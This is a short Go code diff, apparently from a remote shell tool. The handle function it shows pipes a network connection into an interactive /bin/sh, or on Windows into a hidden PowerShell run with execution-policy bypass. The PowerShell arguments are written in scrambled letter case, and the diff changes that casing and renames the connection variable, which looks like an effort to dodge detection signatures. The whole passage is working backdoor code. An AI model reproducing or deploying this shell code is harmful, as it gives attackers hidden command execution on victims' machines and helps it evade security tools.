@@ -8,19 +8,19 @@ import (
 	"runtime"
 )
 
-func handle(src net.Conn) {
-	defer src.Close()
+func handle(shl net.Conn) {
+	defer shl.Close()
 
 	var cmd = exec.Command("/bin/sh", "-i")
 
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("PowErShELl.exe", "-nOPrOFilE", "-W", "hIdDen", "-EXeC", "bYpAsS")
+		cmd = exec.Command("PowErshELl.exe", "-nOPrOFilE", "-W", "hIdDen", "-EXeC", "bYpAsS")
 	}
 
 	r, w := io.Pipe()
-	cmd.Stdin = src
+	cmd.Stdin = shl
 	cmd.Stdout = w
-	go io.Copy(src, r)
+	go io.Copy(shl, r)
 	cmd.Run()
 }
 
